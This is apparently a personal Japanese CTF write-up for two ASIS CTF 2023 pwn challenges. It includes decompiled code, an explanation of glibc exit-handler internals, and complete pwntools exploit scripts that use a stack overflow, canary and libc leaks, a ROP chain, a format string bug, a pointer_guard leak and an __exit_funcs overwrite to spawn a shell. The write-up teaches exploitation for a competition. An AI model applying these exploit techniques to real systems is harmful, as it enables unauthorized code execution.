SECCON 2023 予選で pwn サボっていたツケを払わされたので、本戦では活躍したいってことで CTFtime で適当にやってるやつに参加した。
pwn 結構面白かったし writeup 執筆も再開したいよねってことで書いていく。

今回は ASIS CTF 2023 というCTFに個人で出た。

https://asisctf.com/

# 解いた

- pwn
  - hipwn
  - text-editor

# hipwn

実行ファイルとか Dockerfile がまとめたイメージが渡される。

- glibc: 2.35
- セキュリティ機能: 全部有効
- strip: なし
- ソースコード: なし

面倒なので ghidra

```c
undefined8 main(void) {
  long in_FS_OFFSET;
  uint length;
  char buf [72];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  while( true ) {
    puts("How much???");
    __isoc99_scanf(&DAT_00102010,&length);
    puts("ok... now send content");
    read(0,buf,(ulong)length);
    buf[length] = '\0';
    puts(buf);
    puts("wanna do it again?");
    __isoc99_scanf(&DAT_00102010,&length);
    if (length != 0x539) break;
    puts("i knew it");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

自明な BoF がある。

read は `length` **以下**のバイト列を`buf`に書き込むので、NULL 終端でリークできない問題は回避できる。ちなみに

```
lenght = read(0, buf, (ulong)length);
```

とされたらこの方法は使えないため、実世界のコードではこれで NULL 終端を入れる。

`length` をスタックからはみ出ない程度に大きくした上で、stack canary の 1byte 目の NULL を消して表示すると、canary が手に入る。

2 週目で `main` の帰りアドレスをリークして`libc`もリークする。

最後に canary と一緒に`system(b'/bin/sh\x00')`を呼べばオケ。
`rbp`だけ書き込み領域にセットするのを忘れずに。

exploit.py

```python
def make_io():
    if local:
        return gdb.debug("./patched")
        # return process("./patched")
    else:
        return remote("45.153.243.57", 1337)


def wait(wait_time=1, wait_prompt="waiting..."):
    if local:
        input(wait_prompt)
    else:
        sleep(1)


def send_num(io: tube, num: int):
    io.sendline(str(num).encode())
    wait()


def send_to_read_primitive(io: tube, byte: bytes):
    io.send(byte)
    wait()


def exploit():
    io = make_io()
    current = address["2023-09-23T20:48:23"]

    buf_length = current["canary_at"] - current["buf_start"]

    send_num(io, buf_length + 0x80)
    send_to_read_primitive(io, b"P" * (buf_length + 1))  # overwrite null byte

    io.readuntil(b"P" * (buf_length + 1))
    raw = io.read(8 - 1) + b"\x00"  # null byte
    canary = unpack(raw) << 8

    io.success(f"got canary! {hex(canary)}")

    current = address["2023-09-23T21:12:30"]
    send_num(io, magic)  # restart
    send_num(io, buf_length + 0x80)
    send_to_read_primitive(io, b"P" * (buf_length + 0x8 * 2))

    io.readuntil(b"P" * (buf_length + 0x8 * 2))
    main_ret = read_pointer_amd64(io)

    io.info(f"got libc_start_main_ret: {hex(main_ret)}")

    libc_base = main_ret - (current["main_ret"] - min(current["libc.so.6_r--p"]))
    io.success(f"got libc base: {hex(libc_base)}")

    send_num(io, magic)  # restart
    send_num(io, buf_length + 0x80)
    payload = b"P" * buf_length
    payload += pack(canary)
    payload += pack(
        current["libc.so.6_rw-p"][0]
        - min(current["libc.so.6_r--p"])
        + libc_base
        + 0x100
    )  # rbp

    libc = ELF(
        "/home/iwancof/WorkSpace/CTF/datas/glibc-all-in-one/libs/2.35-0ubuntu3.3_amd64/libc.so.6"
    )
    libc.address = libc_base

    rop = ROP(libc)
    rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

    payload += rop.chain()

    send_to_read_primitive(io, payload)
    send_num(io, 0)  # exit

    io.success("got true world")
    io.sendline("echo 'I pwned you!'")

    io.interactive()
```

# text-editor

hipwn と同じように、バイナリと Dockerfile が配られる。

- glibc: 2.35
- セキュリティ機能: 全部有効
- strip: なし
- ソースコード: なし

ghidra

```c
void setup(void) {
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  return;
}

void print_menu(void) {
  puts("Menu:");
  puts("1. edit text");
  puts("2. save text");
  puts("3. exit");
  printf("> ");
  return;
}

void edit_text(void) {
  printf("Enter new text: ");
  read(0,global_buf,0x108);
  puts("Done!");
  return;
}

void save_text(void *param_1) {
  memcpy(param_1,global_buf,0x108);
  puts("Saved the current text!");
  return;
}

void show_error(void) {
  printf(overwrite_me);
  return;
}

undefined8 main(void) {
  long in_FS_OFFSET;
  int opt;
  undefined stack_buf [264];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  puts("Welcome to simple text editor!");
  while( true ) {
    while( true ) {
      while( true ) {
        print_menu();
        __isoc99_scanf(&get_int,&opt);
        if (opt != 1) break;
        edit_text();
      }
      if (opt != 2) break;
      save_text(stack_buf);
    }
    if (opt == 3) break;
    show_error();
  }
  puts("Bye!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

ただデコンパイルしただけだと分かりづらいけど、`edit_text`はサイズ`0x100`のグローバルバッファ`global_buf`に`0x108`で書き込めてしまっていて、`global_buf`の次に配置されている`overwrite_me`という`char*`型の変数を自由に変更できてしまう脆弱性がある。

さらに、`show_error`では FSB もある。
`overwrite_me`は最初、`"Invalid choice!"`というバイナリ内の文字列を指しているため、ここの下位 2byte を書き換えて`global_buf`に向ける。ASLR を考えると、これは $\frac{1}{16}$ で成功するので現実的。

`global_buf` を適当な文字で埋めると、`show_error`するときに`&global_buf` も一緒に表示されるため、これでバイナリのベースアドレスがリークできる。
（実際の exploit では、バッファのフラッシュを制御するために、不要な`edit`を直後に入れている）

バイナリがリークできたら GOT とかもわかるため、さっきと同じようにバイナリの GOT を`overwrite_me`に入れて libc のベースアドレスがリークする。

ここから RCE に繋げたいが、経験上スタック経由の攻撃は面倒くさい上に環境に強く依存する（環境変数とか諸々によってスタックのアドレス予測が面倒くさい）ので、libc の関数ポインタから`system(b'/bin/sh\x00')`を呼ぶことにした。

多分もっといい方法があるんだろうけど、今回は `__exit_funcs`を書き換えることで RCE した。

exit 時の処理は次のようになっている（重要な部分だけ抜き取っている）。

```c
void attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
    while (true) {
        struct exit_function_list *cur = *listp;

        if (cur == NULL) {
              break;
        }

        while (cur->idx > 0) {
	        struct exit_function *const f = &cur->fns[--cur->idx];
	        const uint64_t new_exitfn_called = __new_exitfn_called;

            switch (f->flavor) {
                void (*atfct) (void);
                void (*onfct) (int status, void *arg);
                void (*cxafct) (void *arg, int status);
                void *arg;

                case ef_free:
                case ef_us:
                  break;
                case ef_on:
                  onfct = f->func.on.fn;
                  arg = f->func.on.arg;

                  PTR_DEMANGLE (onfct);
                  __libc_lock_unlock (__exit_funcs_lock);
                  onfct (status, arg);
                  __libc_lock_lock (__exit_funcs_lock);
                  break;
                case ef_at:
                  atfct = f->func.at;

                  PTR_DEMANGLE (atfct);
                  __libc_lock_unlock (__exit_funcs_lock);
                  atfct ();
                  __libc_lock_lock (__exit_funcs_lock);
                  break;
                case ef_cxa:
                  f->flavor = ef_free;
                  cxafct = f->func.cxa.fn;
                  arg = f->func.cxa.arg;

                  PTR_DEMANGLE (cxafct);
                  __libc_lock_unlock (__exit_funcs_lock);
                  cxafct (arg, status);
                  // これ使いたい！！！！
                  __libc_lock_lock (__exit_funcs_lock);
                  break;
            }

            if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
                continue;
        }

        *listp = cur->next;
        if (*listp != NULL)
            free (cur);
    }

    __libc_lock_unlock (__exit_funcs_lock);

    if (run_list_atexit)
        RUN_HOOK (__libc_atexit, ());

    _exit (status);
}

void exit (int status) {
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```

`exit`する時は、libc 内の`initial`というシンボルから始まる linked-list を順々に手繰っていき、そこに登録されている関数を実行する。

実行される関数は `exit_function_list`、`exit_function` という構造体で管理されている。

```c
enum {
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union {
        void (*at) (void);
        struct {
            void (*fn) (int status, void *arg);
            void *arg;
        } on;
        struct {
            void (*fn) (void *arg, int status);
            void *arg;
            void *dso_handle;
        } cxa;
    } func;
};

struct exit_function_list {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
};
```

ということで、全体の方針として `initial` に最初から登録されている `fns[0]` を書き換えていくことにする。

さて、関数呼び出しのところをよく見ると、flavor によって処理を分けているのがわかる。
`fn = system` とした場合、第一引数に `"/bin/sh\x00"` を入れたいため、`flavor = ef_cxa` として、`arg` にコマンドをを入れる。

幸いなことに、最初から入っている `flavor` は `ef_cxa` なのでちょっとだけ楽ができる。

次に、登録された関数ポインタを呼ぶ前に `PTR_MANGLE` という処理を行っている部分について考える。
このマクロは次のように定義されている。

`glibc/sysdeps/unix/sysv/linux/x86_64/sysdep.h`

```c
#  define PTR_MANGLE(var)	asm ("xor %%fs:%c2, %0\n"		      \
				     "rol $2*" LP_SIZE "+1, %0"		      \
				     : "=r" (var)			      \
				     : "0" (var),			      \
				       "i" (offsetof (tcbhead_t,	      \
						      pointer_guard)))
#  define PTR_DEMANGLE(var)	asm ("ror $2*" LP_SIZE "+1, %0\n"	      \
				     "xor %%fs:%c2, %0"			      \
				     : "=r" (var)			      \
				     : "0" (var),			      \
				       "i" (offsetof (tcbhead_t,	      \
						      pointer_guard)))
```

canary と同じように、`fs` レジスタの指す先にある値と`xor`したりビット転回したりしている。
じゃあこの `pointer_guard` の値は何なのかというと、これは実行時に決まる乱数になっているため、決め打ちで `PTR_MANGLE(system)` を得ることができない。

このままでは `__run_exit_handler` で目的の関数を実行することができないため、この `pointer_guard` をリークすることを考える。

先程いろんな値をリークしたときと全く同じ手順を使って、`__pointer_chk_guard_local`(ここに実際の pointer_guard の値が格納されている) へのポインタを入れて表示し値を取得することで、 `PTR_MANGLE(system)` を計算できるようになる。

`arg` は暗号化されないので適当に `"/bin/sh\x00"` に向ける。

さて、最後にこれらの値を FSB を用いて`&initial`に書き込む工程に入る。
ここで重要になるのが、今まで使ってこなかった`save text`機能になる。

FSB の際、入力文字列がスタックにのっているとその文字列**自身**を指定する書式指定子を入れることで、"%{n}$hhn" で書き込む先を自由に設定することができる。

例えば、

```python
payload = "%10$nPPPPPPPPPPPPPPPPP"
payload += pack(0xdeadbeefcafebabe)
```

とした時、10 番目の指定子に当たる値が `0xdeadbeefcafebabe` になると、`*0xdeadbeefcafebabe` に値が書き込まれることになる。

`printf`を始めとする`va_list`は、これらの値をスタックから取ってくるため、我々が書き込み可能な`global_buf`をスタックに乗っける必要がある。
`save text`を実行することで、`global_buf`の内容が`stack_buf`にコピーされ、それによって FSB が非常に簡単になる。

余談だが、頑張れば`save text`なしでも攻略できる。まず書き換えたい領域の近くを指しているポインタ**を指しているポインタ**を見つけて、それを出力先にポインタをずらして、ずらしたポインタに書き込んで...という作業を繰り返せば良い。非常に面倒だが。

さて、`global_buf`に`initial`を買い換える FSB のペイロードを入れ、`overwrite_me`に`&global_buf`を入れて、`error_chal`を発火させる。

最後に `exit_chal` を実行して`system("/bin/sh\x00")`を発火させ、シェルゲット。

必要ない値取ってきてたり、自作のライブラリ多用してたりするけど、最終的な攻撃コードがこちら。

exploit.py

```python
local = False

def make_io() -> tube:
    if local:
        # return gdb.debug("./patched", exe="./patched_dbg")
        return process("./patched")
    else:
        return remote("45.153.243.57", 13337)

binary = ELF("./patched", checksec=True)
debug_bin = ELF("./patched_dbg", checksec=True)

libc = ELF(
    "/home/iwancof/WorkSpace/CTF/datas/glibc-all-in-one/libs/2.35-0ubuntu3.3_amd64/libc.so.6"
)

ld = ELF(
    "/home/iwancof/WorkSpace/CTF/datas/glibc-all-in-one/libs/2.35-0ubuntu3.3_amd64/ld-linux-x86-64.so.2"
)


def wait():
    if local:
        input("wait")
    else:
        sleep(0.5)


def edit(io: tube, b: bytes, wait_prompt=True):
    if wait_prompt:
        io.sendlineafter(b"> ", b"1")
        io.sendafter(b"text: ", b)
    else:
        io.sendline(b"1")
        io.send(b)
    wait()


def save(io: tube, wait_prompt=True):
    if wait_prompt:
        io.sendlineafter(b"> ", b"2")
    else:
        io.sendline(b"2")


def exit_chal(io: tube, wait_prompt=True):
    if wait_prompt:
        io.sendlineafter(b"> ", b"3")
    else:
        io.sendline(b"3")


def error_chal(io: tube, wait_prompt=True):
    if wait_prompt:
        io.sendlineafter(b"> ", b"4")
    else:
        io.sendline(b"4")


def check(byt: bytes) -> bytes:
    # io = make_io()
    io = process("./patched")

    buf_size = 0x100

    pb = PayloadBuilder()

    pb.append(byt)
    pb.append_unsize(b"P")
    payload = pb.build(buf_size)
    payload += pack(debug_bin.symbols["text"] + 0x4000)[:2]
    assert len(payload) == buf_size + 2

    edit(io, payload)

    save(io)
    error_chal(io)
    result = io.readuntil(b"Menu")[: -len(b"Menu")]

    return result


def exploit():
    # format_string = FmtStr(execute_fmt=check)
    # print(format_string)

    """
    payload = fmtstr_payload(
        format_string.offset, {binary.got["exit"]: binary.symbols["win"]}
    )
    """
    # format_string.offset == 10

    buf_size = 0x100

    padding_payload_base_pb = PayloadBuilder()
    padding_payload_base_pb.append_unsize(b"P")
    padding_payload_base_pb.append(b"END")
    padding_payload_base = padding_payload_base_pb.build(buf_size)

    while True:
        try:
            # io = make_io()
            # io = process("./patched")
            io = gdb.debug("./patched", exe="./patched_dbg")

            payload = padding_payload_base
            payload += pack(debug_bin.symbols["text"] + 0x4000)[:2]
            assert len(payload) == buf_size + 2

            edit(io, payload)

            error_chal(io)
            edit(io, b"TEST", wait_prompt=False)

            io.readuntil(b"END", timeout=3)
            binary_base = read_pointer_amd64(io) - binary.symbols["text"]
            if binary_base & 0xFFF:
                info("not aligned")
                io.close()
                continue
            success(f"binary_base: {hex(binary_base)}")

            binary.address = binary_base

            break
        except EOFError:
            info("EOF")
            io.close()
            continue
        except TimeoutError:
            info("timeout")
            io.close()
            continue

    payload = padding_payload_base
    payload += pack(binary.got["puts"])[:7]
    edit(io, payload)
    error_chal(io)
    edit(io, b"TEST", wait_prompt=False)

    io.readuntil(b"Menu")
    raw = io.readuntil(b"Menu")[: -len(b"Menu")][-6:] + b"\x00\x00"
    libc_base = unpack(raw) - libc.symbols["puts"]
    assert libc_base & 0xFFF == 0

    success(f"libc_base: {hex(libc_base)}")
    libc.address = libc_base

    payload = padding_payload_base
    payload += pack(libc.symbols["__nptl_rtld_global"])[:7]
    edit(io, payload)
    error_chal(io)
    edit(io, b"TEST", wait_prompt=False)

    io.readuntil(b"Menu")
    raw = io.readuntil(b"Menu")[: -len(b"Menu")][-6:] + b"\x00\x00"
    ld_base = unpack(raw) - ld.symbols["_rtld_global"]
    assert ld_base & 0xFFF == 0
    success(f"ld_base: {hex(ld_base)}")
    ld.address = ld_base

    current = address["2023-09-24T14:20:29"]
    # 0x7ffff7fad878 (__nptl_rtld_global) —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
    payload = padding_payload_base
    payload += pack(
        current["mangle_key"] - min(current["ld-linux-x86-64.so.2_r--p"]) + ld_base
    )
    edit(io, payload)
    error_chal(io)
    edit(io, b"TEST", wait_prompt=False)

    io.readuntil(b"Menu")
    raw = io.readuntil(b"Menu")[: -len(b"Menu")][-8:]
    guard = unpack(raw)

    success(f"guard key is {hex(guard)}")

    # read intiial + 24
    current = address["for_initial"]
    payload = padding_payload_base
    payload += pack(
        (current["initial"] + 24) - min(current["libc.so.6_r--p"]) + libc_base
    )
    edit(io, payload)
    error_chal(io)
    edit(io, b"TEST", wait_prompt=False)

    io.readuntil(b"Menu")
    raw = io.readuntil(b"Menu")[: -len(b"Menu")][-8:]
    print(raw)
    exit_func = unpack(raw)
    info(f"exit_func is {hex(exit_func)}")

    exit_func_demangle = bit_rotate_right(exit_func, 64, 0x11) ^ guard
    success(f"exit_func pointer is {hex(exit_func_demangle)}")

    # call system(b'/bin/sh\x00')
    initial = current["initial"] - min(current["libc.so.6_r--p"]) + libc_base

    # STEP1: set function pointer to system
    encrypted_system = bit_rotate_left(libc.symbols["system"] ^ guard, 64, 0x11)

    info(f"writing {hex(encrypted_system)} to {hex(initial + 24)}")
    fsb_payload = fmtstr_payload(
        10,
        {initial + 24: encrypted_system},
        write_size="byte",
    )
    info(fsb_payload)

    assert len(fsb_payload) <= buf_size

    pb = PayloadBuilder()
    pb.append(fsb_payload)
    pb.append_unsize(b"P")
    payload = pb.build(buf_size)
    payload += pack(binary.symbols["text"])

    edit(io, payload)
    save(io)
    error_chal(io)
    edit(io, b"TEST", wait_prompt=False)

    success(f"set exit to system")

    # STEP2: arg = /bin/sh
    binsh = next(libc.search(b"/bin/sh\x00"))

    info(f"writing {hex(binsh)} to {hex(initial + 24 + 8)}")
    fsb_payload = fmtstr_payload(
        10,
        {initial + 24 + 8: binsh},
        write_size="byte",
    )

    assert len(fsb_payload) <= buf_size

    pb = PayloadBuilder()
    pb.append(fsb_payload)
    pb.append_unsize(b"P")
    payload = pb.build(buf_size)
    payload += pack(binary.symbols["text"])

    edit(io, payload)
    save(io)
    error_chal(io)
    edit(io, b"TEST", wait_prompt=False)

    success(f"set arg to /bin/sh")

    # STEP3: call exit
    exit_chal(io)

    success("you got true world")

    io.interactive()

def bit_rotate_right(val: int, width: int, n: int) -> int:
    return (val >> n) | ((val << (width - n)) & ((1 << width) - 1))

def bit_rotate_left(val: int, width, n: int) -> int:
    return ((val << n) & ((1 << width) - 1)) | (val >> (width - n))
```

# 感想

`exit`関連とか`FSOP`とか`_rtld_global`とか、glibc の深い部分全然理解してないので、ここで `exit` ちょっとわかって嬉しい。

ヒープなしでもかなり面白い問題作れるんだね。ヒープ嫌いだから楽しかった。

ヒープから逃げるな。
